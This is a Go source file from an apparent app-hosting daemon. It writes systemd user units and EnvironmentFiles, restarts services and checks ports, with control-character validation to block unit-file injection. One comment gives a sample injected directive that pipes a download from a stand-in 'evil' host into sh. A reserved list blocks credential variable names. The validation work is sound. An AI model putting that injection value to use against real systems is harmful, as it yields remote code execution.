// SPDX-License-Identifier: Apache-2.0

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/carloslfu/computer.md/daemon/audit"
	"github.com/carloslfu/computer.md/daemon/vault"
)

// app_service.go is the daemon-side primitive for "make this command
// a persistent host service the customer can reach." It exists to
// close the architectural trap that bit production on the
// markdown-notes app:
//
//   The manager's bash tool runs inside a sandbox with its own network
//   namespace. Anything the bash tool backgrounds (or spawns into an
//   xterm) inherits that namespace. So `node server.js &` — or even
//   `xterm -e node server.js &` — binds to the sandbox's loopback, not
//   the host's. Caddy on the host reverse-proxies to localhost:PORT
//   and sees nothing listening. Result: an app the manager believes is
//   live, returning HTTP 502 to the customer. Forever.
//
// The right host-netns persistence primitive is systemd-user (one
// service unit per app, owned by the vibecraft user). But the bash
// sandbox can't reach the vibecraft user's systemd dbus to install
// units — the dbus socket lives outside the sandbox. So the manager
// needs the daemon to do this on its behalf.
//
// This file IS that primitive: POST /api/daemon/install-app-service
// over /run/vibecraft.sock with {name, exec_start, port?}. The daemon
// (root, host netns, full access to /home/vibecraft) writes the unit
// file, runs `systemctl --user daemon-reload && enable <name> &&
// restart <name>` as the vibecraft user with the correct
// XDG_RUNTIME_DIR, proves the MainPID changed when a prior process was
// running, and optionally waits for the port to start listening on the
// host.
//
// Auth: withLocalhostAuth (same as /daemon/task, /spawn-worker,
// /notify). The endpoint is reachable to the manager via the
// per-sandbox unix socket and not to anyone else. The dashboard
// intentionally cannot install services — the manager owns its
// authored systems, the customer directs the manager.

// installAppServiceRequest is the on-the-wire shape for the install
// call. Tight schema: every field maps to one line of the generated
// unit file (or a single subsequent shell command).
type installAppServiceRequest struct {
	// Name is the service identifier. Also the systemd unit name
	// (<name>.service) and conventionally matches the route name when
	// the manager registers a public URL for the same app. Validated
	// against systemNamePattern so a malicious name can't path-escape
	// or break the unit-file syntax.
	Name string `json:"name"`

	// ExecStart is the command systemd runs to start the app. Full
	// path required (systemd refuses bare names). Inline arguments are
	// allowed. Resolved at unit-file write time, not eval'd by us, so
	// shell metacharacters are passed through to systemd literally
	// (i.e. you can't pipe — write a wrapper script if you need to).
	ExecStart string `json:"exec_start"`

	// WorkingDirectory is optional but recommended — sets WorkingDir
	// for the unit so relative paths in the app's code resolve from
	// the project root. Defaults to vibecraft's home if empty.
	WorkingDirectory string `json:"working_directory,omitempty"`

	// Port is the local port the app is expected to listen on. When
	// set, the daemon waits up to portListenTimeout after restart
	// for that port to be reachable on the host's loopback. This is
	// the load-bearing check: if the port comes up here, Caddy on the
	// same host can reach it, which means the public URL through the
	// route will actually serve. The whole point of moving away from
	// the sandbox-netns xterm pattern.
	Port int `json:"port,omitempty"`

	// Description is a human-readable label for the systemd unit's
	// Description= line (the line you see in `systemctl --user
	// status`). Cosmetic.
	Description string `json:"description,omitempty"`

	// Environment is a list of KEY=VAL pairs written as Environment=
	// lines in the unit file. The manager resolves any vault secrets
	// before calling; the daemon does not inject vault refs here.
	Environment []string `json:"environment,omitempty"`
}

// installAppServiceResult tells the manager (and any audit reader)
// exactly what happened. Designed so the follow-up message to the
// customer can be written from the response alone — no second
// round-trip needed for "did it actually come up."
type installAppServiceResult struct {
	// Status is the bottom-line summary:
	//   "running"       — unit started AND port is listening (if port given)
	//   "started"       — unit started but no port was given to verify
	//   "not_listening" — unit started but the port never opened in time
	//   "failed"        — daemon-reload / enable-now itself returned an error
	Status string `json:"status"`

	// UnitPath is the absolute path of the written .service file. The
	// manager can reference this in chat if the customer wants to see
	// it, or use it to re-edit the unit later.
	UnitPath string `json:"unit_path"`

	// ListeningAfter reports the host's view of the port AFTER the
	// restart + wait loop. Only set when Port was given in the
	// request. THIS IS THE FIELD THE MANAGER SHOULD CHECK before
	// telling the customer the app is live.
	ListeningAfter bool `json:"listening_after"`

	// OldPID/NewPID prove whether a running service actually cycled.
	// OldPID is 0 when the unit was not running before this call. NewPID
	// is 0 only for no-port commands that exited cleanly; hosted apps
	// with a port must have a non-zero NewPID to report running.
	OldPID int `json:"old_pid,omitempty"`
	NewPID int `json:"new_pid,omitempty"`

	// Restarted is true when the daemon issued a host-side systemd
	// restart. It is intentionally separate from ListeningAfter: a port
	// can be listening because an old process survived, which was the
	// production failure this field exists to rule out.
	Restarted bool `json:"restarted"`

	// Detail is a human-readable explanation populated on failure or
	// partial success. Empty on clean "running" status.
	Detail string `json:"detail,omitempty"`
}

// appServiceRestartResult is returned by POST /api/apps/<name>/restart
// and POST /api/hosted-apps/<name>/restart. It is intentionally
// proof-oriented: "port is open" is not enough; a successful restart
// must show a different MainPID when there was an old MainPID.
type appServiceRestartResult struct {
	OK             bool   `json:"ok"`
	Name           string `json:"name"`
	Unit           string `json:"unit"`
	Status         string `json:"status"`
	OldPID         int    `json:"old_pid"`
	NewPID         int    `json:"new_pid"`
	Port           int    `json:"port,omitempty"`
	ListeningAfter bool   `json:"listening_after"`
	Detail         string `json:"detail,omitempty"`
}

// portListenTimeout is how long we wait after restart for the
// app's port to start accepting connections on the host. 12 seconds
// covers cold Node/Python starts on the m6a-shaped machines we ship
// and stays well under the manager's per-call patience budget.
const portListenTimeout = 12 * time.Second

var serviceCycleTimeout = 15 * time.Second

var (
	vibecraftRuntimeContextFn = vibecraftRuntimeContext
	runHostCmdFn              = runHostCmd
	runAsVibecraftUserFn      = runAsVibecraftUser
	waitForLocalPortFn        = waitForLocalPort
)

// systemdUserDir is the per-user systemd unit directory. The
// vibecraft user's units land here; `systemctl --user daemon-reload`
// picks them up. A var (not const) only so tests can redirect it at a
// temp dir — production never reassigns it.
var systemdUserDir = "/home/vibecraft/.config/systemd/user"

// vibecraftUser is the local user that owns hosted apps. Hardcoded
// because the daemon's whole model is "one customer per machine, one
// service identity (vibecraft) for everything the manager runs."
const vibecraftUser = "vibecraft"

// handleInstallAppService writes a systemd-user unit and starts it,
// optionally verifying that the named port is listening on the host's
// loopback before returning. POST only; localhost-token-authed.
//
// The endpoint is idempotent in shape but NOT in side-effects: a
// second call with the same Name overwrites the unit file (atomic
// via tmp+rename), enables it, and restarts it. That's the right
// shape for "the manager re-deploys after editing the code" — no
// manual disable/uninstall dance, and no false success from an old
// listener that happened to keep the port open.
func (s *Server) handleInstallAppService(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req installAppServiceRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, fmt.Sprintf("invalid JSON: %v", err), http.StatusBadRequest)
		return
	}

	// Name validation — same pattern systems.go uses. Rejects "../",
	// uppercase, spaces, anything that could escape the unit-file path
	// or break the unit syntax.
	if !systemNamePattern.MatchString(req.Name) {
		jsonError(w, "invalid name: must match ^[a-z0-9][a-z0-9_-]*$ (1-64 chars)", http.StatusBadRequest)
		return
	}
	if strings.TrimSpace(req.ExecStart) == "" {
		jsonError(w, "exec_start is required", http.StatusBadRequest)
		return
	}
	// ExecStart MUST start with an absolute path — systemd refuses
	// bare names. Catch this at the API boundary so the failure mode
	// is a clean 400 instead of a confusing systemctl error message
	// the manager has to re-narrate to the customer.
	first := strings.Fields(req.ExecStart)[0]
	if !strings.HasPrefix(first, "/") {
		jsonError(w, "exec_start must begin with an absolute path (systemd requires it)", http.StatusBadRequest)
		return
	}
	if req.Port < 0 || req.Port > 65535 {
		jsonError(w, "port must be 0-65535 (0 = no port check)", http.StatusBadRequest)
		return
	}
	// Reject control chars in EVERY interpolated field (ExecStart,
	// WorkingDirectory, Description, Name, Environment). A newline
	// payload here would inject extra systemd directives → RCE as the
	// vibecraft user. Fail closed with a 400 at the boundary.
	if err := validateUnitFields(req); err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}

	result, err := s.doInstallAppService(r.Context(), req)
	if err != nil {
		s.auditLog.Log(audit.Entry{
			Action:    "install_app_service_error",
			Category:  "systems",
			Details:   fmt.Sprintf("name=%s err=%v", req.Name, err),
			RiskLevel: "medium",
		})
		jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}

	s.auditLog.Log(audit.Entry{
		Action:   "install_app_service",
		Category: "systems",
		Details: fmt.Sprintf("name=%s status=%s listening=%v port=%d",
			req.Name, result.Status, result.ListeningAfter, req.Port),
		RiskLevel: "low",
	})
	jsonResponse(w, http.StatusOK, result)
}

// doInstallAppService is the actual install. Split from the HTTP
// handler so it's straight to unit-test (no httptest dance) and so
// future internal callers (a "redeploy all systems on daemon restart"
// path, say) can use it directly.
func (s *Server) doInstallAppService(ctx context.Context, req installAppServiceRequest) (installAppServiceResult, error) {
	result := installAppServiceResult{
		UnitPath: filepath.Join(systemdUserDir, req.Name+".service"),
	}
	// Defense in depth: re-validate every interpolated field here, not
	// just at the HTTP boundary. The deploy path (deployHostedAppService)
	// reaches this function with ExecStart/WorkingDirectory/Description
	// read back from a unit file and an Environment merged from caller
	// overrides — both must be control-char-clean before they are
	// re-rendered into a unit, or a newline injects a systemd directive.
	// Run before the usage-credit injection below so the daemon's own
	// (reserved-name) vars aren't rejected by the reserved-name check.
	if err := validateUnitFields(req); err != nil {
		return result, err
	}

	// 1. Make sure the user systemd dir exists, owned by vibecraft.
	//    On a clean machine it's created by cloud-init / install.sh;
	//    older machines or BYOM weirdness might not have it. Cheap to
	//    re-ensure.
	if err := ensureVibecraftUserDir(systemdUserDir); err != nil {
		return result, fmt.Errorf("ensuring systemd-user dir: %w", err)
	}

	// 1b. Auto-inject the usage-credit proxy env vars on Managed machines.
	//     Every Managed installed app gets these for free; the app code just does
	//
	//       createOpenAI({
	//         baseURL: process.env.VIBECRAFT_AI_PROXY_URL + '/openai/v1',
	//         apiKey:  process.env.VIBECRAFT_AI_CREDITS_TOKEN,
	//       })
	//
	//     The platform's real OpenAI key is NEVER exposed —
	//     the proxy strips the bearer and injects the platform key
	//     server-side. See daemon/ai_proxy.go for the full chain.
	//
	//     Connected/BYOM operator-owned key mode does not get this
	//     proxy: VibeCraft-metered local app usage requires a relay
	//     before they are safe on customer-owned hardware.
	//
	//     Injected only when the daemon was able to load a credits
	//     token at startup (otherwise the app gets meaningless env
	//     vars; cleaner to omit).
	if s.platformAIProxyEnabled() && s.aiCreditsToken != nil && s.aiCreditsToken.value != "" {
		req.Environment = appendIfMissing(req.Environment,
			"VIBECRAFT_AI_PROXY_URL=http://127.0.0.1:8420/api/ai/credits",
			"VIBECRAFT_AI_CREDITS_TOKEN="+s.aiCreditsToken.value,
		)
	}

	// 2. Render and write the unit file. Atomic random tmp + rename.
	//    systemd catches incremental writes if you don't.
	unit := renderUnitFile(req)
	if err := writeVibecraftFileAtomic(result.UnitPath, []byte(unit), 0o644); err != nil {
		return result, fmt.Errorf("writing unit file: %w", err)
	}

	// 2b. Write the secret-bearing EnvironmentFile 0600. The unit above
	//     is world-readable (0644) and deliberately holds ZERO secret
	//     values — every KEY=VALUE (resolved vault refs, the usage-credit
	//     token) lands here instead, readable only by the vibecraft user
	//     systemd runs the service as. Atomic tmp+rename, same as the
	//     unit. When the app declares no env we remove any stale file so
	//     a redeploy that dropped all vars can't leave secrets behind;
	//     the unit's `EnvironmentFile=-` prefix makes the absence benign.
	envPath := appServiceEnvFilePath(req.Name)
	if hasEnvironment(req.Environment) {
		if err := writeVibecraftFileAtomic(envPath, []byte(renderEnvFile(req.Environment)), 0o600); err != nil {
			return result, fmt.Errorf("writing env file: %w", err)
		}
	} else if err := os.Remove(envPath); err != nil && !os.IsNotExist(err) {
		return result, fmt.Errorf("removing stale env file: %w", err)
	}

	// 3. systemctl --user daemon-reload + enable + restart, as vibecraft
	//    with the right XDG_RUNTIME_DIR. linger-enable is idempotent
	//    and cheap; do it defensively so a brand-new machine with no
	//    prior systemctl --user activity doesn't error out.
	uid, runtimeDir, err := vibecraftRuntimeContextFn()
	if err != nil {
		result.Status = "failed"
		result.Detail = err.Error()
		return result, nil
	}
	if out, err := runHostCmdFn(ctx, "loginctl", "enable-linger", vibecraftUser); err != nil {
		// Not fatal — linger may already be enabled and loginctl
		// returns 0; or this could be a quirky no-systemd-host. Log
		// the output, keep going.
		s.auditLog.Log(audit.Entry{
			Action: "install_app_service_linger_warn", Category: "systems",
			Details:   fmt.Sprintf("name=%s err=%v out=%s", req.Name, err, out),
			RiskLevel: "low",
		})
	}

	unitName := req.Name + ".service"
	if out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "systemctl", "--user", "daemon-reload"); err != nil {
		result.Status = "failed"
		result.Detail = fmt.Sprintf("daemon-reload: %v\n%s", err, out)
		return result, nil
	}
	oldPID, _, _ := systemdUserMainPID(ctx, uid, runtimeDir, unitName)
	result.OldPID = oldPID
	if out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "systemctl", "--user", "enable", unitName); err != nil {
		result.Status = "failed"
		result.Detail = fmt.Sprintf("enable: %v\n%s", err, out)
		return result, nil
	}
	if out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "systemctl", "--user", "restart", unitName); err != nil {
		result.Status = "failed"
		result.Detail = fmt.Sprintf("restart: %v\n%s", err, out)
		return result, nil
	}
	result.Restarted = true

	newPID, cycled, detail := waitForServiceCycle(ctx, uid, runtimeDir, unitName, oldPID, req.Port != 0)
	result.NewPID = newPID
	if detail != "" {
		result.Status = "failed"
		result.Detail = detail
		return result, nil
	}
	if oldPID > 0 && !cycled {
		result.Status = "failed"
		result.Detail = fmt.Sprintf("restart did not cycle %s: old_pid=%d new_pid=%d", unitName, oldPID, newPID)
		return result, nil
	}

	// 4. If the caller gave us a port, wait for it on the host's
	//    loopback. THIS IS THE WHOLE POINT OF THE ENDPOINT — the
	//    manager needs to know whether Caddy can reach the backend,
	//    and Caddy looks at the same loopback we're dialing here.
	if req.Port == 0 {
		result.Status = "started"
		return result, nil
	}
	if waitForLocalPortFn(ctx, req.Port, portListenTimeout) {
		result.Status = "running"
		result.ListeningAfter = true
		return result, nil
	}
	result.Status = "not_listening"
	result.Detail = fmt.Sprintf("unit started but port %d not listening on 127.0.0.1 after %s", req.Port, portListenTimeout)
	return result, nil
}

// handleAppServiceAction is the manager-facing app lifecycle API over
// /run/vibecraft.sock. It intentionally lives outside the sandbox: the
// sandbox cannot and should not see host PIDs, host loopback, or the
// vibecraft user's systemd bus.
func (s *Server) handleAppServiceAction(w http.ResponseWriter, r *http.Request) {
	name, action, ok := parseAppActionPath(r.URL.Path, "/apps/")
	if !ok || name == "" {
		jsonError(w, "app name is required", http.StatusBadRequest)
		return
	}
	if action != "restart" {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	result, code := s.restartHostedAppService(r.Context(), name)
	s.auditLog.Log(audit.Entry{
		Action:   "hosted_app_restart",
		Category: "systems",
		Details: fmt.Sprintf("name=%s status=%s old_pid=%d new_pid=%d port=%d listening=%v actor=manager",
			result.Name, result.Status, result.OldPID, result.NewPID, result.Port, result.ListeningAfter),
		RiskLevel: "low",
	})
	jsonResponse(w, code, result)
}

func (s *Server) restartHostedAppService(ctx context.Context, name string) (appServiceRestartResult, int) {
	result := appServiceRestartResult{
		Name:   name,
		Unit:   name + ".service",
		Status: "failed",
	}
	if !systemNamePattern.MatchString(name) {
		result.Detail = "invalid app name"
		return result, http.StatusBadRequest
	}

	route, err := s.db.GetRoute(name)
	if err != nil {
		result.Detail = "hosted app route not found"
		return result, http.StatusNotFound
	}
	result.Port = route.Port

	uid, runtimeDir, err := vibecraftRuntimeContextFn()
	if err != nil {
		result.Detail = err.Error()
		return result, http.StatusOK
	}
	if out, err := runHostCmdFn(ctx, "loginctl", "enable-linger", vibecraftUser); err != nil {
		s.auditLog.Log(audit.Entry{
			Action: "hosted_app_restart_linger_warn", Category: "systems",
			Details:   fmt.Sprintf("name=%s err=%v out=%s", name, err, out),
			RiskLevel: "low",
		})
	}

	oldPID, out, err := systemdUserMainPID(ctx, uid, runtimeDir, result.Unit)
	if err != nil {
		result.Detail = fmt.Sprintf("read old MainPID: %v\n%s", err, out)
		return result, http.StatusOK
	}
	result.OldPID = oldPID

	if out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "systemctl", "--user", "restart", result.Unit); err != nil {
		result.Detail = fmt.Sprintf("restart: %v\n%s", err, out)
		return result, http.StatusOK
	}

	newPID, cycled, detail := waitForServiceCycle(ctx, uid, runtimeDir, result.Unit, oldPID, true)
	result.NewPID = newPID
	if detail != "" {
		result.Detail = detail
		return result, http.StatusOK
	}
	if oldPID > 0 && !cycled {
		result.Detail = fmt.Sprintf("restart did not cycle %s: old_pid=%d new_pid=%d", result.Unit, oldPID, newPID)
		return result, http.StatusOK
	}
	if !waitForLocalPortFn(ctx, route.Port, portListenTimeout) {
		result.Status = "not_listening"
		result.Detail = fmt.Sprintf("unit restarted but port %d not listening on 127.0.0.1 after %s", route.Port, portListenTimeout)
		return result, http.StatusOK
	}

	result.OK = true
	result.Status = "running"
	result.ListeningAfter = true
	return result, http.StatusOK
}

func parseAppActionPath(path, prefix string) (name, action string, ok bool) {
	rest := strings.TrimPrefix(path, prefix)
	if rest == path || rest == "" {
		return "", "", false
	}
	parts := strings.Split(rest, "/")
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return "", "", false
	}
	n, err := url.PathUnescape(parts[0])
	if err != nil {
		return "", "", false
	}
	a, err := url.PathUnescape(parts[1])
	if err != nil {
		return "", "", false
	}
	return n, a, true
}

func systemdUserMainPID(ctx context.Context, uid, runtimeDir, unit string) (int, string, error) {
	out, err := runAsVibecraftUserFn(ctx, uid, runtimeDir, "systemctl", "--user", "show", unit, "--property=MainPID")
	if err != nil {
		return 0, out, err
	}
	for _, line := range strings.Split(out, "\n") {
		key, value, ok := strings.Cut(strings.TrimSpace(line), "=")
		if !ok || key != "MainPID" {
			continue
		}
		pid, err := strconv.Atoi(strings.TrimSpace(value))
		if err != nil {
			return 0, out, fmt.Errorf("parsing MainPID %q: %w", value, err)
		}
		return pid, out, nil
	}
	return 0, out, fmt.Errorf("MainPID missing from systemctl show output")
}

func waitForServiceCycle(ctx context.Context, uid, runtimeDir, unit string, oldPID int, requireNewPID bool) (newPID int, cycled bool, detail string) {
	end := time.Now().Add(serviceCycleTimeout)
	var lastErr error
	var lastOut string
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return 0, false, ctx.Err().Error()
		default:
		}
		pid, out, err := systemdUserMainPID(ctx, uid, runtimeDir, unit)
		if err != nil {
			lastErr = err
			lastOut = out
			time.Sleep(300 * time.Millisecond)
			continue
		}
		if pid > 0 {
			if oldPID == 0 || pid != oldPID {
				return pid, true, ""
			}
			newPID = pid
		} else if !requireNewPID {
			return 0, oldPID == 0, ""
		}
		time.Sleep(300 * time.Millisecond)
	}
	if lastErr != nil {
		return 0, false, fmt.Sprintf("service MainPID did not become readable after restart: %v\n%s", lastErr, lastOut)
	}
	if requireNewPID && newPID == 0 {
		return 0, false, fmt.Sprintf("service %s has no MainPID after restart", unit)
	}
	return newPID, false, ""
}

// renderUnitFile produces the actual systemd unit text. Kept simple
// and predictable — no templating engine, no conditionals on optional
// fields beyond what's strictly needed. The output is what the
// manager (or operator) sees when they read the file.
//
// SECURITY: the unit file is world-readable (0644 — systemd's user
// manager reads it as the vibecraft user, and `systemctl --user cat`
// expects it readable). It therefore MUST NOT contain secret values.
// Environment is never inlined as `Environment=` lines here; instead the
// unit references a sibling EnvironmentFile= that doInstallAppService
// writes 0600. That keeps resolved vault values and the usage-credit token
// out of the world-readable unit. renderUnitFile assumes every field has
// already passed validateUnitFields / validateAppServiceEnvironment, so
// no value can contain a newline that would inject extra directives.
func renderUnitFile(req installAppServiceRequest) string {
	wd := req.WorkingDirectory
	if wd == "" {
		wd = "/home/" + vibecraftUser
	}
	desc := req.Description
	if desc == "" {
		desc = req.Name
	}
	var b strings.Builder
	b.WriteString("# Written by vibecraft-daemon (install-app-service)\n")
	b.WriteString("# Edit by hand only if you know what you're doing — the manager\n")
	b.WriteString("# re-writes this file on every install-app-service call.\n\n")
	b.WriteString("[Unit]\n")
	b.WriteString("Description=" + desc + "\n")
	b.WriteString("After=default.target\n\n")
	b.WriteString("[Service]\n")
	b.WriteString("Type=simple\n")
	b.WriteString("WorkingDirectory=" + wd + "\n")
	// Secrets stay out of the 0644 unit: point systemd at the 0600
	// EnvironmentFile doInstallAppService writes. `-` prefix = optional,
	// so a unit with no env vars (file absent) still starts cleanly.
	if hasEnvironment(req.Environment) {
		b.WriteString("EnvironmentFile=-" + appServiceEnvFilePath(req.Name) + "\n")
	}
	b.WriteString("ExecStart=" + req.ExecStart + "\n")
	b.WriteString("Restart=on-failure\n")
	b.WriteString("RestartSec=3\n\n")
	b.WriteString("[Install]\n")
	b.WriteString("WantedBy=default.target\n")
	return b.String()
}

// appServiceEnvFilePath is the 0600 sidecar that holds a unit's
// Environment values. Kept next to the unit (<name>.env beside
// <name>.service) so uninstall/cleanup logic that globs systemdUserDir
// finds both. Name is already systemNamePattern-validated by every
// caller, so it can't path-escape.
func appServiceEnvFilePath(name string) string {
	return filepath.Join(systemdUserDir, name+".env")
}

// hasEnvironment reports whether env has at least one non-blank entry.
// Mirrors the blank-dropping renderEnvFile does so the unit only gets an
// EnvironmentFile= line when there is actually a file worth reading.
func hasEnvironment(env []string) bool {
	for _, kv := range env {
		if strings.TrimSpace(kv) != "" {
			return true
		}
	}
	return false
}

// renderEnvFile builds the 0600 EnvironmentFile body: one KEY=VALUE line
// per non-blank entry. systemd's EnvironmentFile parser takes the whole
// remainder of the line as the value (no shell quoting), which is the
// same literal-passthrough semantics the old inline Environment= lines
// had. Values are validated newline-free upstream, so one entry can't
// smuggle a second variable or escape the file.
func renderEnvFile(env []string) string {
	var b strings.Builder
	for _, kv := range env {
		if strings.TrimSpace(kv) == "" {
			continue
		}
		b.WriteString(kv + "\n")
	}
	return b.String()
}

// ensureVibecraftUserDir mkdirs the systemd-user dir if missing and
// chowns it to vibecraft. Idempotent.
func ensureVibecraftUserDir(path string) error {
	if err := rejectSymlinkPath(path); err != nil {
		return err
	}
	if err := os.MkdirAll(path, 0o755); err != nil {
		return err
	}
	if err := rejectSymlinkPath(path); err != nil {
		return err
	}
	return chownToVibecraft(path)
}

func writeVibecraftFileAtomic(path string, data []byte, perm os.FileMode) error {
	dir := filepath.Dir(path)
	if err := rejectSymlinkPath(dir); err != nil {
		return err
	}
	f, err := os.CreateTemp(dir, "."+filepath.Base(path)+".*.tmp")
	if err != nil {
		return err
	}
	tmpPath := f.Name()
	cleanup := true
	defer func() {
		if cleanup {
			_ = os.Remove(tmpPath)
		}
	}()

	if _, err := f.Write(data); err != nil {
		_ = f.Close()
		return err
	}
	if err := f.Chmod(perm); err != nil {
		_ = f.Close()
		return err
	}
	if err := f.Sync(); err != nil {
		_ = f.Close()
		return err
	}
	if err := f.Close(); err != nil {
		return err
	}
	if err := chownToVibecraft(tmpPath); err != nil {
		return err
	}
	if err := os.Chmod(tmpPath, perm); err != nil {
		return err
	}
	if err := rejectSymlinkPath(dir); err != nil {
		return err
	}
	if err := os.Rename(tmpPath, path); err != nil {
		return err
	}
	cleanup = false
	return nil
}

func rejectSymlinkPath(path string) error {
	clean, err := filepath.Abs(filepath.Clean(path))
	if err != nil {
		return err
	}
	if fi, err := os.Lstat(clean); err == nil {
		if fi.Mode()&os.ModeSymlink != 0 {
			return fmt.Errorf("refusing symlink path component %s", clean)
		}
	} else if !os.IsNotExist(err) {
		return err
	}

	const homeRoot = "/home/" + vibecraftUser
	if clean != homeRoot && !strings.HasPrefix(clean, homeRoot+string(os.PathSeparator)) {
		return nil
	}
	cur := string(os.PathSeparator)
	for _, part := range strings.Split(strings.TrimPrefix(clean, string(os.PathSeparator)), string(os.PathSeparator)) {
		if part == "" {
			continue
		}
		cur = filepath.Join(cur, part)
		fi, err := os.Lstat(cur)
		if err != nil {
			if os.IsNotExist(err) {
				return nil
			}
			return err
		}
		if fi.Mode()&os.ModeSymlink != 0 {
			return fmt.Errorf("refusing symlink path component %s", cur)
		}
	}
	return nil
}

// chownToVibecraft sets path's owner+group to the vibecraft user.
// No-op on non-Linux (mac dev builds don't have a "vibecraft" user).
func chownToVibecraft(path string) error {
	u, err := user.Lookup(vibecraftUser)
	if err != nil {
		// Dev environment without vibecraft user — skip silently.
		return nil
	}
	uid, _ := strconv.Atoi(u.Uid)
	gid, _ := strconv.Atoi(u.Gid)
	return os.Chown(path, uid, gid)
}

// vibecraftRuntimeContext returns the uid and XDG_RUNTIME_DIR for
// running systemctl --user commands as the vibecraft user. Both are
// derived from os/user; we don't hardcode uid 1000 because BYOM
// installs might land vibecraft on a different uid.
func vibecraftRuntimeContext() (uid, runtimeDir string, err error) {
	u, err := user.Lookup(vibecraftUser)
	if err != nil {
		return "", "", fmt.Errorf("looking up vibecraft user: %w", err)
	}
	return u.Uid, "/run/user/" + u.Uid, nil
}

// runHostCmd runs a host-context command (as root, the daemon's
// identity) with a small timeout and returns combined output. Used
// for loginctl and other root-required calls.
func runHostCmd(ctx context.Context, name string, args ...string) (string, error) {
	cctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	cmd := exec.CommandContext(cctx, name, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// runAsVibecraftUser runs a command as the vibecraft user with the
// XDG_RUNTIME_DIR set correctly for `systemctl --user`. Uses sudo
// because dropping privilege via syscall + setting up the user env
// is fiddlier than letting sudo do it — daemon is root, sudo from
// root to a uid never prompts, this is the cleanest path.
func runAsVibecraftUser(ctx context.Context, uid, runtimeDir, name string, args ...string) (string, error) {
	cctx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()
	full := append([]string{
		"-u", vibecraftUser,
		"--preserve-env=XDG_RUNTIME_DIR",
		name,
	}, args...)
	cmd := exec.CommandContext(cctx, "sudo", full...)
	cmd.Env = append(os.Environ(), "XDG_RUNTIME_DIR="+runtimeDir)
	_ = uid // kept in signature so future call sites that need it explicitly don't have to re-derive
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// waitForLocalPort polls 127.0.0.1:<port> until it accepts a TCP
// connection or `deadline` elapses. Returns true on first successful
// connect. This is the "did Caddy actually get a backend to reach"
// check — Caddy and we dial the same loopback, so a successful dial
// here is proof Caddy can reverse-proxy to this port.
func waitForLocalPort(ctx context.Context, port int, deadline time.Duration) bool {
	addr := "127.0.0.1:" + strconv.Itoa(port)
	end := time.Now().Add(deadline)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return false
		default:
		}
		c, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
		if err == nil {
			_ = c.Close()
			return true
		}
		time.Sleep(250 * time.Millisecond)
	}
	return false
}

// appendIfMissing adds each KEY=VAL entry to env only if no existing
// entry already declares the same KEY. Used by doInstallAppService
// to inject the AI proxy env vars without overriding a caller that
// (rarely) wants to point an app at a different proxy URL.
func appendIfMissing(env []string, additions ...string) []string {
	have := map[string]bool{}
	for _, e := range env {
		if i := indexByte(e, '='); i > 0 {
			have[e[:i]] = true
		}
	}
	for _, add := range additions {
		i := indexByte(add, '=')
		if i <= 0 {
			continue
		}
		if have[add[:i]] {
			continue
		}
		env = append(env, add)
		have[add[:i]] = true
	}
	return env
}

func validateAppServiceEnvironment(env []string) error {
	for _, raw := range env {
		// Reject control chars on the RAW entry (before TrimSpace) — a
		// trailing "\nExecStartPre=..." would otherwise survive into the
		// unit/EnvironmentFile and inject a directive. This is the core
		// systemd-unit-injection guard for the Environment field.
		if hasControlChar(raw) {
			return fmt.Errorf("environment entry contains a control character (newline/carriage-return/NUL not allowed)")
		}
		e := strings.TrimSpace(raw)
		if e == "" {
			continue
		}
		i := indexByte(e, '=')
		if i <= 0 {
			return fmt.Errorf("environment entries must be KEY=VALUE")
		}
		key := strings.TrimSpace(e[:i])
		val := e[i+1:]
		if appServiceReservedEnvName(key) {
			return fmt.Errorf("environment variable %s is reserved by VibeCraft", key)
		}
		if appServiceReservedEnvValue(val) {
			return fmt.Errorf("environment variable %s references a reserved VibeCraft credential path", key)
		}
	}
	return nil
}

// validateUnitFields rejects control characters in every request field
// that renderUnitFile interpolates into the systemd unit. Without this a
// value like "wd\nExecStartPre=/bin/sh -c 'curl evil|sh'" injects an
// arbitrary directive and runs as the vibecraft user — an RCE. systemd
// directives are strictly one-per-line, so forbidding \n \r \x00 (and
// any other control char) at the API boundary is sufficient and keeps
// the renderer a dumb string builder. Environment is checked separately
// by validateAppServiceEnvironment (called on both the install and
// deploy paths); this covers ExecStart, WorkingDirectory, Description,
// and Name.
func validateUnitFields(req installAppServiceRequest) error {
	for _, f := range []struct {
		name string
		val  string
	}{
		{"name", req.Name},
		{"exec_start", req.ExecStart},
		{"working_directory", req.WorkingDirectory},
		{"description", req.Description},
	} {
		if hasControlChar(f.val) {
			return fmt.Errorf("%s contains a control character (newline/carriage-return/NUL not allowed)", f.name)
		}
	}
	return validateAppServiceEnvironment(req.Environment)
}

// hasControlChar reports whether s contains any ASCII control character
// (U+0000–U+001F or U+007F DEL). These are exactly the bytes that can
// start a new systemd directive (\n, \r) or terminate a C string (\x00),
// none of which are legitimate in a unit-file field value.
func hasControlChar(s string) bool {
	for i := 0; i < len(s); i++ {
		if c := s[i]; c < 0x20 || c == 0x7f {
			return true
		}
	}
	return false
}

func appServiceReservedEnvName(key string) bool {
	switch key {
	case "OPENAI_API_KEY",
		"ANTHROPIC_API_KEY",
		"VIBECRAFT_LOCAL_TOKEN",
		"VIBECRAFT_MANAGER_KEY_MODE",
		"VIBECRAFT_MANAGER_MODEL",
